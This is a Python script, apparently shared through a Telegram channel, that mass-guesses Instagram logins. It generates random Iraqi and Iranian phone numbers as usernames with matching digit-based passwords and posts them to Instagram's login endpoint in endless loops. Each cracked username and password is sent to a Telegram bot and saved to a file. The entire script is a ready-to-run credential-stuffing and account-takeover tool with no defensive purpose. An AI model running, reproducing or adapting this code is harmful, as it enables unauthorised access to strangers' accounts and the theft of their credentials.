#This Tool by @YSYSD|| @VNVN6
#channel  : t.me/VNVN6
 
#Not for sale is free 
#الاداة مجانيه وليست للبيع
 
 
#↑↑↑↑↑↑↑↑
#######################
 
import os
 
try:
    import uuid , requests , time , pyfiglet , webbrowser , sys
 
    from random import *
    from user_agent import generate_user_agent
    from datetime import datetime
 
 
except:
    os.system ("pip install uuid")
    os.systeam("pip install random ")
    os.system("pip install string")
    os.system ("pip install requests ")
    os.system("pip install user_agent ")
    os.system("pip install datetime ")
    os.system("pip install pyfiglet")
 
 
os.system("clear")
 
import pyfiglet , os
from time import sleep
 
 
#
os.system("clear")
 
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
 
sleep (0.5)
print("""
 
\033[2;35m     <   _______  _______ ____ 
\033[2;35m        | ____\ \/ / ____/ ___|
\033[2;35m        |  _|  \  /|  _|| |    
\033[2;35m        | |___ /  \| |__| |___ v1.5
\033[2;35m        |_____/_/\_\_____\____|   >
\033[1;31m           < Dont Give Up +
\033[1;31m     This Tool Hinting Instagram
\033[1;31m                IQ >
 
""")
 
def j(z):
    for e in z:
     sys.stdout.write(e) 
     sys.stdout.flush() 
     time.sleep(260/10000)
sleep (0.5)
 
import os , uuid , requests , string , json , threading , secrets
 
from user_agent import generate_user_agent
from datetime import datetime
from random import *
from time import sleep
from colorama import Fore, Style
from time import sleep
from datetime import datetime
from secrets import token_hex
from uuid import uuid4
from user_agent import generate_user_agent
from uuid import uuid4
 
 
j("""\033[2;36m
    - Choose One of The Options So We Can Start The Hunting Process :""")
print('''  
       ''')
j('      '+C+'['+F+'1'+C+']'+Z+' - AsiA :')
print('''  
       ''')
j('      '+C+'['+F+'2'+C+']'+Z+' - ZaiN :')
print('''  
       ''')   
j('      '+C+'['+F+'3'+C+']'+Z+' - KorK :')
print('''  
       ''')
j('      '+C+'['+F+'4'+C+']'+Z+' - IraN :')
print('''  
       ''')     
yso = input ('   '+C+'['+Z+'¡'+C+']'+B+' - Chose : '+A)
 
j("""\033[2;36m
    - Hello Sir, We Need Token and ID To Send \n The Catch To The Bot. Please Enter Them Correctly :""")
print('''  
       ''')
exec1 = input(' EnTer YoUr ID : ')
 
print('\n')
sleep(1.5)
exec2 = input(' EnTer YoUr ToKeN : ')
 
j("""\033[2;36m
    - ExEc StaRt HunTing :""")
print('''  
       ''')    
w= 'https://pastebin.com/raw/xPfV5eKD'
start_msg = requests.post(f"https://api.telegram.org/bot{exec2}/sendMessage?chat_id={exec1}&text= ExEc StaRt ").json()
msg =(start_msg['result']["message_id"])
 
Time = time.localtime()
current_time = time.strftime("%H:%M:%S", Time)
r = requests.Session()
cc = 0
qq = 0
ex3 = 0
import random , string
Nummber = '1234567890'
if  yso == '1':
 
    while True:
        us = str("".join(random.choice(Nummber)for i in range(5)))        
        username = '+96477255'+us
        password = '077255'+us
 
        url = 'https://www.instagram.com/accounts/login/ajax/h2'          
        headers = {
 
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
 
        'Accept': "*/*",
 
        'Cookie': 'missing',
 
        'Accept-Encoding': 'gzip, deflate',
 
        'Accept-Language': 'en-US',
 
        'X-IG-Capabilities': '3brTvw==',
 
        'X-IG-Connection-Type': 'WIFI',
 
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 
        'Host': 'i.instagram.com'
 
 
        }      
 
 
        uid = str(uuid4())        
        data = {        
        'uuid': uid,        
 
        'password': password, 
 
         'username': username,         
 
         'device_id': uid,       
 
         'from_reg': 'false',
 
         '_csrftoken': 'missing',        
 
         'login_attempt_countn': '0'
 
         }          
        req_login = r.post(url,headers=headers,data=data,allow_redirects=True)  
        if ("logged_in_user") in req_login.text:
 
 
            cc += 1
            print ('username : '+username+': password : '+password)
 
            tlg =(f'''https://api.telegram.org/bot{exec2}/sendMessage?chat_id={exec1}&text= • 𝑯𝒆𝒍𝒍𝒐 - 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎
\n- 𝑷𝑯 ➪ {username} ✓\n- 𝑷𝑺 ➪ : {password}\n━━━━━━━━━━━━━\n• 𝐅𝐫𝐎𝐦 : @YSYSD -K- @VNVN6''')
            i = requests.post(tlg)
            with open('instagram.txt','a') as ExEc:
 
                ExEc.write(X+' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username,password))
 
 
        elif '"message":"challenge_required","challenge"' in req_login.text:
            print (Z1+'username : '+username+': password : '+password)
 
 
        else:
            requests.post(f"https://api.telegram.org/bot{exec2}/editmessagetext?chat_id={exec1}&message_id={msg}&text= • 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎ ➪[{cc}] \n [{qq}] x ( {username} ) {current_time} \n  • 𝐅𝐫𝐎𝐦 : @YSYSD -Y- @VNVN6 ")
            print (X+'- 𝗨𝒔𝐑 𖡋   : '+username+': 𝐁𝒂𝐒 𖡋  : '+password)
            qq += 1
 
 
if  yso == '2':
 
    while True:
        us = str("".join(random.choice(Nummber)for i in range(5)))        
        username = '+96478255'+us
        password = '078255'+us
 
        url = 'https://www.instagram.com/accounts/login/ajax/h2'          
        headers = {
 
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
 
        'Accept': "*/*",
 
        'Cookie': 'missing',
 
        'Accept-Encoding': 'gzip, deflate',
 
        'Accept-Language': 'en-US',
 
        'X-IG-Capabilities': '3brTvw==',
 
        'X-IG-Connection-Type': 'WIFI',
 
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 
        'Host': 'i.instagram.com'
 
 
        }      
 
 
        uid = str(uuid4())        
        data = {        
        'uuid': uid,        
 
        'password': password, 
 
         'username': username,         
 
         'device_id': uid,       
 
         'from_reg': 'false',
 
         '_csrftoken': 'missing',        
 
         'login_attempt_countn': '0'
 
         }          
        req_login = r.post(url,headers=headers,data=data,allow_redirects=True)  
        if ("logged_in_user") in req_login.text:
 
 
            cc += 1
            print ('username : '+username+': password : '+password)
 
            tlg =(f'''https://api.telegram.org/bot{exec2}/sendMessage?chat_id={exec1}&text= • 𝑯𝒆𝒍𝒍𝒐 - 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎
\n- 𝑷𝑯 ➪ {username} ✓\n- 𝑷𝑺 ➪ : {password}\n━━━━━━━━━━━━━\n• 𝐅𝐫𝐎𝐦 : @YSYSD -K- @VNVN6''')
            i = requests.post(tlg)
            with open('instagram.txt','a') as ExEc:
 
                ExEc.write(X+' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username,password))
 
 
        elif '"message":"challenge_required","challenge"' in req_login.text:
            print (Z1+'username : '+username+': password : '+password)
 
 
        else:
            requests.post(f"https://api.telegram.org/bot{exec2}/editmessagetext?chat_id={exec1}&message_id={msg}&text= • 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎ ➪[{cc}] \n [{qq}] x ( {username} ) {current_time} \n  • 𝐅𝐫𝐎𝐦 : @YSYSD -Y- @VNVN6 ")
            print (X+'- 𝗨𝒔𝐑 𖡋   : '+username+': 𝐁𝒂𝐒 𖡋  : '+password)
            qq += 1
 
 
if  yso == '3':
 
    while True:
        us = str("".join(random.choice(Nummber)for i in range(5)))        
        username = '+96475255'+us
        password = '075255'+us
 
        url = 'https://www.instagram.com/accounts/login/ajax/h2'          
        headers = {
 
        'User-Agent': 'Instagram 232.0.0.16.144 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
 
        'Accept': "*/*",
 
        'Cookie': 'missing',
 
        'Accept-Encoding': 'gzip, deflate',
 
        'Accept-Language': 'en-US',
 
        'X-IG-Capabilities': '3brTvw==',
 
        'X-IG-Connection-Type': 'WIFI',
 
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 
        'Host': 'i.instagram.com'
 
 
        }      
 
 
        uid = str(uuid4())        
        data = {        
        'uuid': uid,        
 
        'password': password, 
 
         'username': username,         
 
         'device_id': uid,       
 
         'from_reg': 'false',
 
         '_csrftoken': 'missing',        
 
         'login_attempt_countn': '0'
 
         }          
        req_login = r.post(url,headers=headers,data=data,allow_redirects=True)  
        if ("logged_in_user") in req_login.text:
 
 
            cc += 1
            print ('username : '+username+': password : '+password)
 
            tlg =(f'''https://api.telegram.org/bot{exec2}/sendMessage?chat_id={exec1}&text= • 𝑯𝒆𝒍𝒍𝒐 - 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎
\n- 𝑷𝑯 ➪ {username} ✓\n- 𝑷𝑺 ➪ : {password}\n━━━━━━━━━━━━━\n• 𝐅𝐫𝐎𝐦 : @YSYSD -K- @VNVN6''')
            i = requests.post(tlg)
            with open('instagram.txt','a') as ExEc:
 
                ExEc.write(X+' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username,password))
 
 
        elif '"message":"challenge_required","challenge"' in req_login.text:
            print (Z1+'username : '+username+': password : '+password)
 
 
        else:
            requests.post(f"https://api.telegram.org/bot{exec2}/editmessagetext?chat_id={exec1}&message_id={msg}&text= • 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎ ➪[{cc}] \n [{qq}] x ( {username} ) {current_time} \n  • 𝐅𝐫𝐎𝐦 : @YSYSD -Y- @VNVN6 ")
            print (X+'- 𝗨𝒔𝐑 𖡋   : '+username+': 𝐁𝒂𝐒 𖡋  : '+password)
            qq += 1

if  yso == '4':
 
    while True:
        us = str("".join(random.choice(Nummber)for i in range(8)))        
        username = '+981'+us
        password = '091'+us
 
        url = 'https://www.instagram.com/accounts/login/ajax/h2'          
        headers = {
 
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
 
        'Accept': "*/*",
 
        'Cookie': 'missing',
 
        'Accept-Encoding': 'gzip, deflate',
 
        'Accept-Language': 'en-US',
 
        'X-IG-Capabilities': '3brTvw==',
 
        'X-IG-Connection-Type': 'WIFI',
 
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 
        'Host': 'i.instagram.com'
 
 
        }      
 
 
        uid = str(uuid4())        
        data = {        
        'uuid': uid,        
 
        'password': password, 
 
         'username': username,         
 
         'device_id': uid,       
 
         'from_reg': 'false',
 
         '_csrftoken': 'missing',        
 
         'login_attempt_countn': '0'
 
         }          
        req_login = r.post(url,headers=headers,data=data,allow_redirects=True)  
        if ("logged_in_user") in req_login.text:
 
 
            cc += 1
            print ('username : '+username+': password : '+password)
 
            tlg =(f'''https://api.telegram.org/bot{exec2}/sendMessage?chat_id={exec1}&text= • 𝑯𝒆𝒍𝒍𝒐 - 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎
\n- 𝑷𝑯 ➪ {username} ✓\n- 𝑷𝑺 ➪ : {password}\n━━━━━━━━━━━━━\n• 𝐅𝐫𝐎𝐦 : @YSYSD -K- @VNVN6''')
            i = requests.post(tlg)
            with open('instagram.txt','a') as ExEc:
 
                ExEc.write(X+' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username,password))
 
 
        elif '"message":"challenge_required","challenge"' in req_login.text:
            print (Z1+'username : '+username+': password : '+password)
 
 
        else:
            requests.post(f"https://api.telegram.org/bot{exec2}/editmessagetext?chat_id={exec1}&message_id={msg}&text= • 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎ ➪[{cc}] \n [{qq}] x ( {username} ) {current_time} \n  • 𝐅𝐫𝐎𝐦 : @YSYSD -Y- @VNVN6 ")
            print (X+'- 𝗨𝒔𝐑 𖡋   : '+username+': 𝐁𝒂𝐒 𖡋  : '+password)
            qq += 1
